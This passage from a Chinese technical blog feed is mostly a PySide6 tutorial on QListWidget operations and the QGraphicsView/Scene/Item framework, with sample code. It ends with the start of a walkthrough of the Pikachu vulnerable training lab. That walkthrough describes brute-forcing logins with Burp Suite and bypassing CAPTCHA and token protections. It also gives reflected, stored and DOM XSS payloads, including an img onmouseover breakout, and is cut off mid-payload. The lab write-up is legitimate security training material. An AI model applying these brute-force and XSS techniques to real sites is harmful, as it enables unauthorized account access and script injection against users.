title="插入元素"></a>插入元素</h4><p>插入元素同样有<code>insertItem</code>及<code>insertItems</code>两种方法，分别是一次性插入一个和多个元素</p><p><code>insertItem</code>方法需要传入两个参数，分别是插入位置和插入元素</p><p>例如我们在刚刚的列表的第三个位置插入数字3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.listWidget.insertItem(<span class="number">2</span>, <span class="string">&#x27;3&#x27;</span>)</span><br></pre></td></tr></table></figure><img src="/posts/1f9a4bfd6ae8/image-20240214161956657.png" class="" title="image-20240214161956657"><p>而<code>insertItems</code>则是指定插入位置以及字符串序列</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.listWidget.insertItems(<span class="number">2</span>, [<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>])</span><br></pre></td></tr></table></figure><img src="/posts/1f9a4bfd6ae8/image-20240214162225047.png" class="" title="image-20240214162225047"><h4 id="删除元素"><a href="#删除元素" class="headerlink" title="删除元素"></a>删除元素</h4><p>删除列表中的元素需要用到<code>takeItem</code>方法</p><p>例如我们想删除列表中的第三个元素，我们只需传入被删元素的序号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.listWidget.takeItem(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><h4 id="修改元素"><a href="#修改元素" class="headerlink" title="修改元素"></a>修改元素</h4><p>要修改列表中的某个元素，我们需要先获取到该元素</p><p>此时需要用到<code>item</code>方法，我们将获取的目标元素赋给一个变量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">itemGet = self.listWidget.item(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><div class="note warning flat"><p>当我们向列表中添加或者插入元素时，无论是用的字符串还是<code>QListWidgetItem</code>，每个元素最后都会成为<code>QListWidgetItem</code>数据结构，所以我们的接收变量<code>itemGet</code>也是指向一个<code>QListWidgetItem</code></p></div><p>我们直接使用该数据结构的方法<code>setText</code>即可修改它的文本内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">itemGet.setText(<span class="string">&#x27;6&#x27;</span>)</span><br></pre></td></tr></table></figure><p>或者我们也可以压缩到一行语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.listWidget.item(<span class="number">2</span>).setText(<span class="string">&#x27;6&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="查找元素"><a href="#查找元素" class="headerlink" title="查找元素"></a>查找元素</h4><p>查找元素涉及到<code>findItem</code>方法</p><p>我们需要传入两个参数，匹配的字符串，以及<strong>匹配模式</strong></p><p>当然，匹配模式需要我们先导入核心库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide6.QtCore <span class="keyword">import</span> Qt</span><br></pre></td></tr></table></figure><p>下面是一些常用的匹配模式</p><div class="table-container"><table><thead><tr><th>匹配模式名</th><th>特点</th></tr></thead><tbody><tr><td>MatchContains</td><td>匹配包含目标字符串的元素</td></tr><tr><td>MatchEndsWith</td><td>匹配以目标字符串结尾的元素</td></tr><tr><td>MatchStartsWith</td><td>匹配以目标字符串开头的元素</td></tr><tr><td>MatchCaseSensitive</td><td>匹配时区分大小写</td></tr><tr><td>MatchRegularExpression</td><td>正则匹配</td></tr><tr><td>MatchExactly</td><td>完美匹配</td></tr></tbody></table></div><p>该方法会返回一个列表变量，该变量中包括所有符合条件的元素</p><p>例如我想输出列表中所有包含<code>张</code>字的人名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">result = self.listWidget.findItems(<span class="string">&#x27;张&#x27;</span>, Qt.MatchFlag.MatchContains)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> result:</span><br><span class="line">    <span class="built_in">print</span>(item.text())</span><br></pre></td></tr></table></figure><img src="/posts/1f9a4bfd6ae8/image-20240214172738996.png" class="" title="image-20240214172738996"><h3 id="常用信号和槽"><a href="#常用信号和槽" class="headerlink" title="常用信号和槽"></a>常用信号和槽</h3><h4 id="currentItemChanged"><a href="#currentItemChanged" class="headerlink" title="currentItemChanged"></a>currentItemChanged</h4><p><code>currentItemChanged</code>信号可以侦测到当前选则元素的改变</p><div class="note primary flat"><p><strong>选则(selected)</strong>即列表元素的一种显示状态，鼠标点击的列表元素会被选则，背景会被加深为蓝色</p><p><img src="/posts/1f9a4bfd6ae8/image-20240214183343854.png" class="" title="image-20240214183343854"></p><p>列表会默认选则第一个元素，只是它的背景不会被加深</p></div><p>例如我们可以写一个测试程序：当前选则元素改变时，输出新选则元素的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">bind</span>(<span class="params">self</span>):</span><br><span class="line">    self.listWidget.currentItemChanged.connect(self.currentChanged)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">currentChanged</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="built_in">print</span>(self.listWidget.currentItem().text())</span><br></pre></td></tr></table></figure><p><code>currentItem()</code>方法用于获取当前选则的元素</p><p>其实<code>currentItemChanged</code>信号会向槽发送两个参数，分别为当前选则元素及上一个选则的元素</p><img src="/posts/1f9a4bfd6ae8/image-20240214183603127.png" class="" title="image-20240214183603127"><p>此时我们可以简化槽函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">currentChanged</span>(<span class="params">self, item</span>):</span><br><span class="line">    <span class="built_in">print</span>(item.text())</span><br></pre></td></tr></table></figure><h4 id="itemChanged"><a href="#itemChanged" class="headerlink" title="itemChanged"></a>itemChanged</h4><p><code>itemChanged</code>信号可以侦测到当前选中元素的状态改变</p><div class="note primary flat"><p>当某个列表元素被设置为可选时，元素左侧会出现小方框，当鼠标勾选该方框时则为<strong>选中(checked)</strong></p></div><p>例如我们给第一个元素先设置为未选中状态</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.listWidget.item(<span class="number">0</span>).setCheckState(Qt.CheckState.Unchecked)</span><br></pre></td></tr></table></figure><img src="/posts/1f9a4bfd6ae8/image-20240215013857088.png" class="" title="image-20240215013857088"><p>同时我们使用<code>itemChanged</code>信号来侦测元素的选中状态，当有元素的选中状态发生变化时，<code>itemChanged</code>信号会发送该元素给槽</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">self.listWidget.itemChanged.connect(self.itemChanged)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">itemChanged</span>(<span class="params">self, item</span>):</span><br><span class="line">    <span class="built_in">print</span>(item.text(), item.checkState())</span><br></pre></td></tr></table></figure><p><code>checkState()</code>属性会返回元素的选中状态，不过并不是布尔值，而是特定的枚举类型</p><img src="/posts/1f9a4bfd6ae8/image-20240215014436386.png" class="" title="image-20240215014436386"><h4 id="clear"><a href="#clear" class="headerlink" title="clear"></a>clear</h4><p><code>clear()</code>槽在被调用时会清空列表中的所有元素</p><h3 id="列表排序"><a href="#列表排序" class="headerlink" title="列表排序"></a>列表排序</h3><p>想要对列表中的元素进行排序时，使用<code>sortItems</code>方法</p><p>我们只需向该方法传入排序规则即可，升序即<code>AscendingOrder</code>，降序传入<code>DescendingOrder</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.listWidget.sortItems(Qt.SortOrder.DescendingOrder)</span><br></pre></td></tr></table></figure><p>下面是数字列表的升序演示</p><img src="/posts/1f9a4bfd6ae8/image-20240214212434989.png" class="" title="image-20240214212434989"><p>该排序规则<strong>使用的是字符串排序比较规则</strong>，即<strong>从第一个字符开始比较</strong>，所以不是单纯的数字从小到大</p><h3 id="列表的上下文菜单"><a href="#列表的上下文菜单" class="headerlink" title="列表的上下文菜单"></a>列表的上下文菜单</h3><p>给列表控件添加上下文菜单的方法与之前介绍的控件上下文菜单一致</p><p>首先给列表控件设置上下文菜单的策略</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.listWidget.setContextMenuPolicy(Qt.ContextMenuPolicy.ActionsContextMenu)</span><br></pre></td></tr></table></figure><p>接着我们向其中添加<code>Action</code>，即操作</p><div class="note warning flat"><p>事实上，这是一种<strong>伪上下文菜单</strong>，因为我们无法对列表中的具体元素定制上下文菜单的内容，所有元素使用的上下文菜单都是一样的</p></div><h2 id="图形视图框架"><a href="#图形视图框架" class="headerlink" title="图形视图框架"></a>图形视图框架</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>在之前文章的内容中，我们想要显示图片，只能通过<code>QLabel</code>控件</p><p>但是由于<code>Qlabel</code>本身并不是为浏览图片设计的，所以对交互等限制很大</p><p>同时如果我们想显示多张图片时，使用<code>Qlabel</code>也较为麻烦</p><p>pyside6中的<strong>图形视图框架</strong>可以让我们<strong>管理大量的自定义2D图元并与之交互</strong>。</p><p>图形视图框架主要包含三个类：<code>QGraphicsItem</code>图元类、<code>QGraphicsScene</code>场景类和<code>QGraphicsView</code>视图类。</p><p>简单概括下三者的关系就是：图元放在场景上，场景内容通过视图来显示。下面我们来一一进行讲解</p><h3 id="框架核心"><a href="#框架核心" class="headerlink" title="框架核心"></a>框架核心</h3><div class="note info flat"><p>在 PySide6的图形视图框架中，<strong>场景（Scene）、视图（View）和图元（Graphics Items）</strong>之间的关系构成了框架的核心。</p><p><strong>场景</strong>是一个抽象的二维空间，用于组织和管理图元，但它本身不负责图元的渲染。</p><p><strong>图元</strong>是场景中的基本构建块，用于表示所有可视化对象。它们存在于场景中，由场景管理。</p><p><strong>视图</strong>是场景的可视化表示，是用户与场景和图元交互的界面。一个场景可以被多个视图展示，每个视图可以展示场景的不同部分或以不同方式渲染相同的内容。</p></div><p><code>QGraphicsView</code>类与<code>QGraphicsScene</code>类配套实现了类似<strong>Mode/View</strong>的架构，这种设计模式旨在分离图形的管理与图形的呈现。</p><p>使用图形视图框架的一般流程包括：</p><ol><li>创建一个 QGraphicsScene 实例来存储和管理图形项。</li><li>创建各种 QGraphicsItem 实例，并将它们<strong>添加</strong>到场景中。</li><li>创建一个 QGraphicsView 实例，将其设置为显示前面创建的场景。</li><li>使用 QGraphicsView 提供的功能来导航和交互场景。</li></ol><h3 id="图元类-QGraphicsItem"><a href="#图元类-QGraphicsItem" class="headerlink" title="图元类(QGraphicsItem)"></a>图元类(QGraphicsItem)</h3><p>图元在图形视图框架中可以表现为文本、图像、标准的几何形状或者是自定义的图形。已经有一些预定义的图元类型提供给开发者使用，包括：</p><ul><li>QGraphicsLineItem 用于表示直线。</li><li>QGraphicsRectItem 用于表示矩形。</li><li>QGraphicsEllipseItem 用于表示椭圆。</li><li>QGraphicsPixmapItem 用于展示图片。</li><li>QGraphicsTextItem 用于展示文本。</li><li>QGraphicsPathItem 用于绘制复杂的图形路径。</li></ul><p>例如下面的代码创建了一个矩形框图元，左上角坐标为同时给它设置可拖拽和可选择的属性</p><p>坐标为(120,30)，宽50，高30</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">self.rect = QGraphicsRectItem()</span><br><span class="line">self.rect.setRect(<span class="number">120</span>, <span class="number">30</span>, <span class="number">50</span>, <span class="number">30</span>)</span><br><span class="line">self.rect.setFlags(QGraphicsItem.ItemIsMovable | QGraphicsItem.ItemIsSelectable)</span><br></pre></td></tr></table></figure><h3 id="场景类-QGraphicsScene"><a href="#场景类-QGraphicsScene" class="headerlink" title="场景类(QGraphicsScene)"></a>场景类(QGraphicsScene)</h3><p><strong>场景</strong>是所有图元的容器，提供了一个二维空间，在这个空间中可以添加、移动和管理图元。可以将场景想象成一个无限大的画布，而你可以在任意位置放置图形对象（如矩形、椭圆、文本等）。</p><p>场景本身是独立于任何视图的，这意味着你可以有多个视图展示同一个场景的不同部分或以不同的方式（如不同的缩放级别）</p><p>我们可以将场景<strong>类比于模型</strong>，同一个模型可以有不同的展示方式，同时多个场景也可以通过切换展示在同一个视图中。</p><p><code>QGraphicsScene</code>类拥有非常多的管理图元的方法</p><p>首先我们通过下面这行代码创建一个场景</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.scene = QGraphicsScene()</span><br></pre></td></tr></table></figure><p>当然，场景作为一个画布，我们需要为其设置大小</p><p>而且，图元在场景中的位置是通过坐标来确定的，所以我们还需要设置坐标原点</p><p>下面这行代码通过<code>setSceneRect</code>方法，设置场景的大小为<code>300X300</code>，坐标原点为<code>(0,0)</code>，即左上角</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.scene.setSceneRect(<span class="number">0</span>, <span class="number">0</span>, <span class="number">300</span>, <span class="number">300</span>)</span><br></pre></td></tr></table></figure><p>接下来，通过将<code>addItem</code>方法将之前创建的矩形图元添加到场景中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.scene.addItem(self.rect)</span><br></pre></td></tr></table></figure><p>当然，除了直接添加图元实例，<code>QGraphicsScene</code>类还提供了一些方法，用于向场景中快速添加不同种类的图元（免去创建图元这一步骤），这些方法会返回创建的图元的指针，我们可以用变量接收</p><img src="/posts/1f9a4bfd6ae8/image-20240216165255103.png" class="" title="image-20240216165255103"><h3 id="视图类-QGraphicsView"><a href="#视图类-QGraphicsView" class="headerlink" title="视图类(QGraphicsView)"></a>视图类(QGraphicsView)</h3><p>图元和场景部分均属于模型，而<strong>视图则是实际显示出来的窗口控件（QWidget）</strong>，与控件一样，它最终会被添加到布局并展示在窗口中</p><p>和场景一样，视图也是基于笛卡尔坐标系，左上角为原点，向右为x正轴，向下为y正轴。</p><img src="/posts/1f9a4bfd6ae8/image-20240216171518532.png" class="" title="image-20240216171518532"><p>如果视图的尺寸小于场景的尺寸，视图会变成一个可滚动的区域，允许用户通过滚动条查看整个场景的内容。即使视图与场景的大小相同，滚动条也会出现（需要手动隐藏）。</p><p>下面的代码创建了一个300X300大小的视图控件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">self.view = QGraphicsView()</span><br><span class="line">self.view.resize(<span class="number">300</span>, <span class="number">300</span>)</span><br></pre></td></tr></table></figure><p>接下来我们需要设置视图展示的场景，并将视图添加到布局中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">self.view.setScene(self.scene)</span><br><span class="line">self.mainLayout.addWidget(self.view)</span><br></pre></td></tr></table></figure><p>效果如下</p><img src="/posts/1f9a4bfd6ae8/image-20240216171937119.png" class="" title="image-20240216171937119"><h3 id="交互机制"><a href="#交互机制" class="headerlink" title="交互机制"></a>交互机制</h3><div class="note warning flat"><p><code>QGraphicsItem</code> 并没有继承 <code>QObject</code> 类，因此它自身<strong>不支持信号与槽</strong>的机制，也不能直接应用动画效果。</p></div><p>虽然不能使用信号与槽，图形视图框架也有一些用于和用户交互的机制</p><ol><li><p><strong>事件处理</strong>:</p><p><code>QGraphicsItem</code> 提供了一系列的事件处理函数，可以被重写来响应不同的事件，例如鼠标点击（<code>mousePressEvent</code>）、鼠标移动（<code>mouseMoveEvent</code>）等。通过重写这些事件处理函数，可以在事件发生时执行特定的逻辑，从而模拟信号和槽的行为。</p></li><li><p><strong>场景事件</strong>:</p><p><code>QGraphicsScene</code> 也提供了事件处理机制，比如 <code>itemClicked</code>、<code>itemHovered</code> 等事件。通过在场景层面处理这些事件，可以实现对场景中图元事件的响应。由于 <code>QGraphicsScene</code> 继承自 <code>QObject</code>，它能够使用信号和槽机制，从而允许场景与其他 QObject 对象或图元之间的通信。</p></li><li><p><strong>定时器</strong>:</p><p>对于需要定时更新或检查状态的图元，可以使用 <code>QTimer</code>。<code>QTimer</code> 是基于 <code>QObject</code> 的，因此支持信号和槽。通过在图元中使用定时器，可以定时触发特定的行为，而无需直接在图元中实现信号和槽的机制。</p></li><li><p><strong>绘制更新</strong>：</p><p>图元类中提供了<code>paint</code>方法，当图元、场景或者视图发送变化时，Qt 会自动调用<code>paint</code>方法，重新绘制视图</p><p>我们可以通过重写的 <code>paint</code> 方法，在其中添加绘制行为，并设置绘制条件</p></li></ol><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>下面我们通过一个例子来体现前面提到的四种交互机制</p><p>首先我们创建一个新的图元类<code>NewRectItem</code>，继承<code>QGraphicsRectItem</code></p><p>其中我们<strong>重写鼠标响应以及悬停的事件处理函数</strong>，加上我们想要的反馈：鼠标点击时图元变色、悬停时边框变红，用于测试事件处理机制</p><p>重写paint方法来添加自定义的绘图条件及行为：当矩形图元在鼠标下方时会在中间画一个圆，用于测试绘制更新机制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">NewRectItem</span>(<span class="title class_ inherited__">QGraphicsRectItem</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x, y, width, height</span>):</span><br><span class="line">        <span class="built_in">super</span>(NewRectItem, self).__init__(x, y, width, height)</span><br><span class="line">        self.setAcceptHoverEvents(<span class="literal">True</span>)  <span class="comment"># 启用悬停事件</span></span><br><span class="line">        self.setFlags(QGraphicsItem.ItemIsMovable )</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 1. 事件处理: </span></span><br><span class="line">    <span class="comment"># 重写鼠标点击事件来改变框内颜色</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mousePressEvent</span>(<span class="params">self, event</span>):</span><br><span class="line">        self.setBrush(QColor(random.randint(<span class="number">0</span>, <span class="number">255</span>), random.randint(<span class="number">0</span>, <span class="number">255</span>), random.randint(<span class="number">0</span>, <span class="number">255</span>)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 重写悬停事件来改变边框颜色</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hoverEnterEvent</span>(<span class="params">self, event</span>):</span><br><span class="line">        self.setPen(QPen(Qt.red, <span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hoverLeaveEvent</span>(<span class="params">self, event</span>):</span><br><span class="line">        self.setPen(QPen(Qt.black, <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 绘制更新: </span></span><br><span class="line">    <span class="comment"># 重写paint来添加自定义的绘图条件及行为</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">paint</span>(<span class="params">self, painter, option, widget</span>):</span><br><span class="line"></span><br><span class="line">        <span class="built_in">super</span>().paint(painter, option, widget)</span><br><span class="line">        <span class="keyword">if</span> self.isUnderMouse():</span><br><span class="line">            <span class="comment"># 如果被选中，在中间绘制一个圆</span></span><br><span class="line">            centerX = self.boundingRect().x()+self.boundingRect().width()/<span class="number">2</span></span><br><span class="line">            centerY = self.boundingRect().y()+self.boundingRect().height()/<span class="number">2</span></span><br><span class="line">            radius = <span class="built_in">min</span>(self.boundingRect().width(),self.boundingRect().height())/<span class="number">4</span>  <span class="comment"># 圆的半径为矩形最短边的四分之一</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 设置画笔和画刷来绘制圆</span></span><br><span class="line">            painter.setPen(QPen(QColor(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">127</span>), <span class="number">2</span>))  <span class="comment"># 设置圆的边框颜色和宽度</span></span><br><span class="line">            painter.setBrush(QColor(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">127</span>))  <span class="comment"># 设置圆的填充颜色和透明度</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 绘制圆</span></span><br><span class="line">            painter.drawEllipse(QPointF(centerX, centerY), radius, radius)</span><br></pre></td></tr></table></figure><p>接下来我们也自定义一个新场景<code>MyScene</code></p><p>通过重写场景事件<code>mouseDoubleClickEvent</code>来达到交互效果：双击鼠标时，在场景添加一个矩形图元</p><p>同时设置一个每秒触发一次的计时器，用于测试计时器机制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyScene</span>(<span class="title class_ inherited__">QGraphicsScene</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, parent=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="built_in">super</span>(MyScene, self).__init__(parent)</span><br><span class="line">        self.timer = QTimer()</span><br><span class="line">        self.timer.timeout.connect(self.onTimeout)</span><br><span class="line">        self.timer.start(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 场景事件: 重写 mouseDoubleClickEvent 来响应鼠标双击</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mouseDoubleClickEvent</span>(<span class="params">self, event</span>):</span><br><span class="line">        rect = NewRectItem(event.scenePos().x() - <span class="number">25</span>, event.scenePos().y() - <span class="number">25</span>, <span class="number">50</span>, <span class="number">50</span>)</span><br><span class="line">        self.addItem(rect)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4. 定时器: 将timeout信号与自定义的槽函数onTimeout连接</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">onTimeout</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 定时器触发的行为：旋转所有图元</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> self.items():</span><br><span class="line">            </span><br><span class="line">            centerX = item.boundingRect().x()+item.boundingRect().width()/<span class="number">2</span></span><br><span class="line">            centerY = item.boundingRect().y()+item.boundingRect().height()/<span class="number">2</span></span><br><span class="line"></span><br><span class="line">            item.setTransformOriginPoint(centerX, centerY)</span><br><span class="line">            item.setRotation(item.rotation() + <span class="number">10</span>) </span><br></pre></td></tr></table></figure><div class="note warning flat"><p>需要注意的是，由于图元是沿着变换原点旋转，所以每次触发旋转事件时需要使用<code>setTransformOriginPoint</code>方法<strong>更新变换原点</strong>，将其矫正到矩形中央的坐标</p></div><p>最后我们在场景中添加几个矩形图元</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 初始化一些图元</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    rect = NewRectItem(random.randint(<span class="number">0</span>, <span class="number">150</span>), random.randint(<span class="number">0</span>, <span class="number">150</span>), <span class="number">50</span>, <span class="number">50</span>)</span><br><span class="line">    self.scene.addItem(rect)</span><br></pre></td></tr></table></figure><p>交互效果如下：</p><img src="/posts/1f9a4bfd6ae8/2024-02-16-22-24-24.gif" class="" title="2024-02-16-22-24-24"><h2 id="实践：OCR可视化"><a href="#实践：OCR可视化" class="headerlink" title="实践：OCR可视化"></a>实践：OCR可视化</h2><p>这两天调研了一下WPS的图片转文字功能后，突然发现Pyside6的<strong>图形视图框架及列表控件非常适合用来实现OCR可视化</strong></p><img src="/posts/1f9a4bfd6ae8/image-20240215161859316.png" class="" title="image-20240215161859316"><p>右侧文字部分在被鼠标覆盖时，背景颜色会加深，这与列表控件的特性很相似</p><p>而左侧的检测框则可以看成是一个个图元，因为它也具有能交互的特性</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> note </tag>
            
            <tag> GUI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pikachu靶场通关记录</title>
      <link href="/posts/975e18bab440/"/>
      <url>/posts/975e18bab440/</url>
      
        <content type="html"><![CDATA[<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><h3 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h3><p>随便输入一个密码并点击登录，用burpsuite抓包</p><img src="/posts/975e18bab440/image-20240418132253859.png" class="" title="image-20240418132253859"><p>转给爆破模块，由于只用爆破密码这一个变量，使用狙击手模式</p><img src="/posts/975e18bab440/image-20240418132524753.png" class="" title="image-20240418132524753"><p>导入字典开始爆破，在结果中按长度排序找到正确密码</p><img src="/posts/975e18bab440/image-20240418141921330.png" class="" title="image-20240418141921330"><h3 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h3><img src="/posts/975e18bab440/image-20240418142250037.png" class="" title="image-20240418142250037"><p>本关多了一个在服务器后台验证的验证码</p><p>只要我们不把包放过，许多网页应用的服务器后台是不会刷新验证码，或者验证码在一段时间内有效</p><img src="/posts/975e18bab440/image-20240418142723689.png" class="" title="image-20240418142723689"><p>保留当前的验证码，仍然以密码作为变量爆破</p><img src="/posts/975e18bab440/image-20240418142848550.png" class="" title="image-20240418142848550"><h3 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h3><p>由于验证码判断是在前端进行，我们直接禁用JavaScript功能再爆破即可</p><h3 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破"></a>token防爆破</h3><p>本关先抓包观察一下请求内容</p><p>可以发现在登录时还需要上传token，所以我们可以使用爆破模块的音叉模式</p><img src="/posts/975e18bab440/image-20240418145157313.png" class="" title="image-20240418145157313"><p>定义密码和token这两个变量，token抓取页面中的token值即可</p><img src="/posts/975e18bab440/image-20240418145534629.png" class="" title="image-20240418145534629"><img src="/posts/975e18bab440/image-20240418145628794.png" class="" title="image-20240418145628794"><p>当然此时由于payload是抓取页面上的值，所以不能使用多线程，需要将线程设为1</p><h2 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h2><h3 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h3><p>尝试<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><img src="/posts/975e18bab440/image-20240418150128513.png" class="" title="image-20240418150128513"><p>输到一半发现存在长度限制，前往页面元素中调整</p><img src="/posts/975e18bab440/image-20240418150250576.png" class="" title="image-20240418150250576"><p>成功弹窗</p><h3 id="反射型xss-post"><a href="#反射型xss-post" class="headerlink" title="反射型xss(post)"></a>反射型xss(post)</h3><p>本关和上一关不一样的是提交的POST请求，当然构造的xss语句与上一关一致</p><h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><p>将之前的注入语句从留言板提交后，会被存储到网站的数据库中，所以只要后续浏览该页面，无论是否提交内容，都会弹窗</p><h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><p>观察页面的js</p><img src="/posts/975e18bab440/image-20240418152518361.png" class="" title="image-20240418152518361"><p>我们在框中输入的内容会被放入a标签加到页面上</p><p>所以和其他类型的注入攻击思路一样，首先思考如何闭合以构造注入语句</p><p>我们可以将href属性闭合，后面的内容会被作为a标签的其他属性</p><p>当然也可以将a标签闭合，后面的内容则会直接被当作HTML元素</p><p>尝试提示的两种方法</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;</span></span><br><span class="line">&#x27; 